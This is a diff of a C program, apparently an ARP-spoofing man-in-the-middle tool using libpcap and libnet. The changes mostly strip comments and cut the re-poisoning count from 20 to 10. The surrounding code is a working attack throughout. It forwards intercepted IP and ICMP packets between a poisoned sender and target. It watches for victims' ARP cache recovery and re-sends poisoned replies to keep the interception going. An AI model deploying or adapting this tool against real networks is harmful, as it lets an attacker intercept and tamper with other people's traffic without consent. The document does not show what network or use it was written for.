@@ -172,7 +172,6 @@ int send_poison(pcap_t* pcap, const uint8_t* my_mac, const uint8_t* sender_mac, 
 	return 0;
 }
 
-// Check if MAC address is our own
 int is_my_mac(const uint8_t* mac1, const uint8_t* mac2) {
 	return memcmp(mac1, mac2, 6) == 0;
 }
@@ -186,7 +185,6 @@ int find_sender_index(arp_pair* pairs, int count, const char* ip) {
 	return -1;
 }
 
-// Check if an IP address matches any target in our pairs
 int find_target_index(arp_pair* pairs, int count, const char* ip) {
 	for (int i = 0; i < count; i++) {
 		if (strcmp(pairs[i].target_ip, ip) == 0) {
@@ -196,7 +194,6 @@ int find_target_index(arp_pair* pairs, int count, const char* ip) {
 	return -1;
 }
 
-// Function to relay IP packets from sender to target or target to sender
 int relay_ip_packet(pcap_t* pcap, const u_char* packet, struct pcap_pkthdr* header,
 		const uint8_t* my_mac, const uint8_t* dst_mac) {
 	u_char* new_packet = (u_char*)malloc(header->len);
@@ -205,15 +202,12 @@ int relay_ip_packet(pcap_t* pcap, const u_char* packet, struct pcap_pkthdr* head
 		return -1;
 	}
 
-	// Copy original packet
 	memcpy(new_packet, packet, header->len);
 
-	// Modify Ethernet header for forwarding
 	struct libnet_ethernet_hdr* eth_hdr = (struct libnet_ethernet_hdr*)new_packet;
 	memcpy(eth_hdr->ether_dhost, dst_mac, ETHER_ADDR_LEN);
 	memcpy(eth_hdr->ether_shost, my_mac, ETHER_ADDR_LEN);
 
-	// Send the modified packet
 	if (pcap_sendpacket(pcap, new_packet, header->len) != 0) {
 		fprintf(stderr, "Failed to relay IP packet: %s\n", pcap_geterr(pcap));
 		free(new_packet);
@@ -227,19 +221,17 @@ int relay_ip_packet(pcap_t* pcap, const u_char* packet, struct pcap_pkthdr* head
 int detect_recovery(const u_char* packet, arp_pair* pairs, int cnt) {
 	struct libnet_ethernet_hdr* eth_hdr = (struct libnet_ethernet_hdr*)packet;
 	if (ntohs(eth_hdr->ether_type) != ETHERTYPE_ARP) {
-		return -1; // Not an ARP packet
+		return -1;
 	}
 
 	struct libnet_arp_hdr* arp_hdr = (struct libnet_arp_hdr*)(packet + LIBNET_ETH_H);
 
-	// Extract ARP packet details
 	uint8_t* arp_data = (uint8_t*)(packet + LIBNET_ETH_H + LIBNET_ARP_H);
-	uint8_t* src_hw = arp_data;                        // Sender MAC
-	uint8_t* src_ip = arp_data + 6;                    // Sender IP
-	uint8_t* dst_hw = arp_data + 10;                   // Target MAC
-	uint8_t* dst_ip = arp_data + 16;                   // Target IP
+	uint8_t* src_hw = arp_data;
+	uint8_t* src_ip = arp_data + 6;
+	uint8_t* dst_hw = arp_data + 10;
+	uint8_t* dst_ip = arp_data + 16;
 
-	// Convert IPs to strings for comparison
 	char src_ip_str[16], dst_ip_str[16];
 	struct in_addr addr;
 
@@ -248,13 +240,11 @@ int detect_recovery(const u_char* packet, arp_pair* pairs, int cnt) {
 
 	addr.s_addr = *(uint32_t*)dst_ip;
 	inet_ntop(AF_INET, &addr, dst_ip_str, sizeof(dst_ip_str));
-	printf("ARP detected\n");
+	
 	for (int i = 0; i < cnt; i++) {
-		// SCENARIO 1: Sender's ARP cache has expired and it's requesting target's MAC
-		// Detect: Sender -> ALL (ARP_REQ) for target IP
 		if (ntohs(arp_hdr->ar_op) == ARPOP_REQUEST && 
 				strcmp(src_ip_str, pairs[i].sender_ip) == 0 && 
-				memcmp(dst_hw, "\x00\x00\x00\x00\x00\x00", 6) == 0) { // Broadcast
+				memcmp(dst_hw, "\x00\x00\x00\x00\x00\x00", 6) == 0) {
 
 			printf("Recovery detected (SCENARIO 1): Sender %s is broadcasting ARP request for target %s\n", 
 					src_ip_str, dst_ip_str);
@@ -262,14 +252,14 @@ int detect_recovery(const u_char* packet, arp_pair* pairs, int cnt) {
 		}
 		if (ntohs(arp_hdr->ar_op) == ARPOP_REQUEST &&
                                 strcmp(src_ip_str, pairs[i].target_ip) == 0 &&
-                                memcmp(dst_hw, "\x00\x00\x00\x00\x00\x00", 6) == 0) { // Broadcast
+                                memcmp(dst_hw, "\x00\x00\x00\x00\x00\x00", 6) == 0) {
 
                         printf("Recovery detected (SCENARIO 2): Target %s is broadcasting ARP request for sender %s\n",
                                         src_ip_str, dst_ip_str);
                         return i;
                 }
 	}
-	return -1; // No recovery detected
+	return -1;
 }
 
 int main(int argc, char* argv[]) {
@@ -344,7 +334,6 @@ int main(int argc, char* argv[]) {
 
 	printf("Starting MITM Attack with ARP Spoofing\n");
 
-	// Main packet capture and relay loop
 	struct pcap_pkthdr* header;
 	const u_char* packet;
 
@@ -358,20 +347,16 @@ int main(int argc, char* argv[]) {
 			break;
 		}
 
-		// Extract Ethernet header
 		struct libnet_ethernet_hdr* eth_hdr = (struct libnet_ethernet_hdr*)packet;
 
-		// Skip packets sent by us to avoid loops
 		if (is_my_mac(eth_hdr->ether_shost, my_mac)) {
 			continue;
 		}
 
-		// Check for ARP recovery
 		int recovered_pair = detect_recovery(packet, pairs, cnt);
 		if (recovered_pair >= 0) {
-			// Re-infect this specific pair immediately
 			printf("Re-infecting pair %d after recovery detection\n", recovered_pair);
-			for (int i = 0; i < 20; i++) {
+			for (int i = 0; i < 10; i++) {
 				send_poison(pcap, my_mac, pairs[recovered_pair].sender_mac, 
 						pairs[recovered_pair].sender_ip, 
 						pairs[recovered_pair].target_ip);
@@ -379,15 +364,11 @@ int main(int argc, char* argv[]) {
 			}
 		}
 
-		// Check if this packet is destined for us (after our ARP poisoning)
 		int is_for_me = is_my_mac(eth_hdr->ether_dhost, my_mac);
 
-		// Handle IP packets for relaying (including ICMP)
 		if (ntohs(eth_hdr->ether_type) == ETHERTYPE_IP && is_for_me) {
-			// Extract IP header
 			struct libnet_ipv4_hdr* ip_hdr = (struct libnet_ipv4_hdr*)(packet + LIBNET_ETH_H);
 
-			// Convert IP addresses to strings
 			char src_ip[16], dst_ip[16];
 			struct in_addr src_addr, dst_addr;
 
@@ -397,14 +378,11 @@ int main(int argc, char* argv[]) {
 			inet_ntop(AF_INET, &src_addr, src_ip, sizeof(src_ip));
 			inet_ntop(AF_INET, &dst_addr, dst_ip, sizeof(dst_ip));
 
-			// Check for packets from sender to target
 			int sender_idx = find_sender_index(pairs, cnt, src_ip);
 			int target_idx = find_target_index(pairs, cnt, dst_ip);
 			if (sender_idx == target_idx && sender_idx >= 0) {
-				// This packet came from a sender, relay to its target
 				printf("Relaying IP packet from sender %s to target %s", src_ip, dst_ip);
 
-				// Check for ICMP specifically
 				if (ip_hdr->ip_p == IPPROTO_ICMP) {
 					printf(" (ICMP packet)");
 				}
